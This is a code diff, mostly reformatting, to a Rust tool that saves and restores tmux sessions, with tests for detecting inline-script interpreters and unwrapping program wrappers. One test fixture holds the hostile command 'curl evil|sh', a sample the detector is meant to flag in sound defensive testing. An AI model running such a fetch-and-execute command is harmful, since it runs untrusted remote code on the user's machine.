@@ -77,9 +77,10 @@ pub fn restore_save(
         // (`=`, `*`, `-`, `:`) that would address other live sessions in the
         // kill-session/set-option calls below. Skip anything not our shape.
         if !valid_session_name(&session.name) {
-            report
-                .notes
-                .push(format!("skipped session with invalid name {:?}", session.name));
+            report.notes.push(format!(
+                "skipped session with invalid name {:?}",
+                session.name
+            ));
             continue;
         }
         let target = if live.contains(&session.name) {
@@ -541,7 +542,10 @@ fn venv_activation(fg: &FgProc) -> Option<String> {
         return Some(format!("conda activate {}", sh_quote(&name)));
     }
     if let Some(venv) = get("VIRTUAL_ENV").filter(|v| !v.is_empty()) {
-        return Some(format!("source {}", sh_quote(&format!("{venv}/bin/activate"))));
+        return Some(format!(
+            "source {}",
+            sh_quote(&format!("{venv}/bin/activate"))
+        ));
     }
     None
 }
@@ -595,8 +599,7 @@ fn restartable(fg: &FgProc, opts: &RestoreOptions) -> bool {
     // Membership is tested against the UNWRAPPED program (uv run jupyter ->
     // jupyter), so wrapped invocations match the safe-list too.
     let eff = effective_name(fg);
-    opts.restart_arbitrary
-        || opts.programs.iter().any(|p| p.eq_ignore_ascii_case(&eff))
+    opts.restart_arbitrary || opts.programs.iter().any(|p| p.eq_ignore_ascii_case(&eff))
 }
 
 /// Pre-typing puts these bytes under the shell cursor via `send-keys -l`,
@@ -805,10 +808,10 @@ mod tests {
         // A configured resume recipe runs its own argv via --exec-trusted,
         // in preference to pre-typing / re-running the captured command.
         let mut o = opts();
-        o.resume = [("claude".to_string(), vec![
+        o.resume = [(
             "claude".to_string(),
-            "--continue".to_string(),
-        ])]
+            vec!["claude".to_string(), "--continue".to_string()],
+        )]
         .into_iter()
         .collect();
         let p = pane(Some(FgProc {
@@ -820,7 +823,10 @@ mod tests {
         }));
         let mut report = RestoreReport::default();
         let cmd = spawn_command(&p, Path::new("/tmp/save"), &o, &mut report);
-        assert!(cmd.contains("'--exec-trusted' 'claude' '--continue'"), "{cmd}");
+        assert!(
+            cmd.contains("'--exec-trusted' 'claude' '--continue'"),
+            "{cmd}"
+        );
         assert!(!cmd.contains("'--exec' "));
     }
 
@@ -840,10 +846,7 @@ mod tests {
     fn fgp(argv: &[&str]) -> FgProc {
         let argv: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
         FgProc {
-            name: argv
-                .first()
-                .map(|a| basename_lower(a))
-                .unwrap_or_default(),
+            name: argv.first().map(|a| basename_lower(a)).unwrap_or_default(),
             argv,
             cwd: "/".into(),
             env: Vec::new(),
@@ -854,17 +857,29 @@ mod tests {
     #[test]
     fn inline_script_runners_are_detected() {
         // #2 crown jewel: an interpreter carrying an inline script/module.
-        assert!(carries_inline_script(&fgp(&["sh", "-c", "htop; curl evil|sh"]).argv));
+        assert!(carries_inline_script(
+            &fgp(&["sh", "-c", "htop; curl evil|sh"]).argv
+        ));
         assert!(carries_inline_script(&fgp(&["bash", "-c", "x"]).argv));
-        assert!(carries_inline_script(&fgp(&["python3", "-c", "import os"]).argv));
-        assert!(carries_inline_script(&fgp(&["python", "-m", "http.server"]).argv));
+        assert!(carries_inline_script(
+            &fgp(&["python3", "-c", "import os"]).argv
+        ));
+        assert!(carries_inline_script(
+            &fgp(&["python", "-m", "http.server"]).argv
+        ));
         assert!(carries_inline_script(&fgp(&["node", "-e", "x"]).argv));
         // …even hidden behind transparent wrappers.
-        assert!(carries_inline_script(&fgp(&["nohup", "sh", "-c", "x"]).argv));
-        assert!(carries_inline_script(&fgp(&["env", "A=b", "bash", "-c", "x"]).argv));
+        assert!(carries_inline_script(
+            &fgp(&["nohup", "sh", "-c", "x"]).argv
+        ));
+        assert!(carries_inline_script(
+            &fgp(&["env", "A=b", "bash", "-c", "x"]).argv
+        ));
         // Real programs and `run`-style wrappers are NOT inline scripts.
         assert!(!carries_inline_script(&fgp(&["htop"]).argv));
-        assert!(!carries_inline_script(&fgp(&["uv", "run", "jupyter", "lab"]).argv));
+        assert!(!carries_inline_script(
+            &fgp(&["uv", "run", "jupyter", "lab"]).argv
+        ));
         assert!(!carries_inline_script(&fgp(&["python"]).argv)); // bare REPL
     }
 
@@ -898,12 +913,27 @@ mod tests {
 
     #[test]
     fn effective_name_unwraps_runners() {
-        assert_eq!(effective_name(&fgp(&["uv", "run", "jupyter", "lab"])), "jupyter");
-        assert_eq!(effective_name(&fgp(&["poetry", "run", "ipython"])), "ipython");
+        assert_eq!(
+            effective_name(&fgp(&["uv", "run", "jupyter", "lab"])),
+            "jupyter"
+        );
+        assert_eq!(
+            effective_name(&fgp(&["poetry", "run", "ipython"])),
+            "ipython"
+        );
         assert_eq!(effective_name(&fgp(&["nohup", "psql", "-h", "db"])), "psql");
-        assert_eq!(effective_name(&fgp(&["env", "A=b", "redis-cli"])), "redis-cli");
-        assert_eq!(effective_name(&fgp(&["python", "-m", "http.server"])), "http.server");
-        assert_eq!(effective_name(&fgp(&["sh", "-c", "flask run --port 5000"])), "flask");
+        assert_eq!(
+            effective_name(&fgp(&["env", "A=b", "redis-cli"])),
+            "redis-cli"
+        );
+        assert_eq!(
+            effective_name(&fgp(&["python", "-m", "http.server"])),
+            "http.server"
+        );
+        assert_eq!(
+            effective_name(&fgp(&["sh", "-c", "flask run --port 5000"])),
+            "flask"
+        );
         assert_eq!(effective_name(&fgp(&["/usr/bin/htop"])), "htop");
     }
 
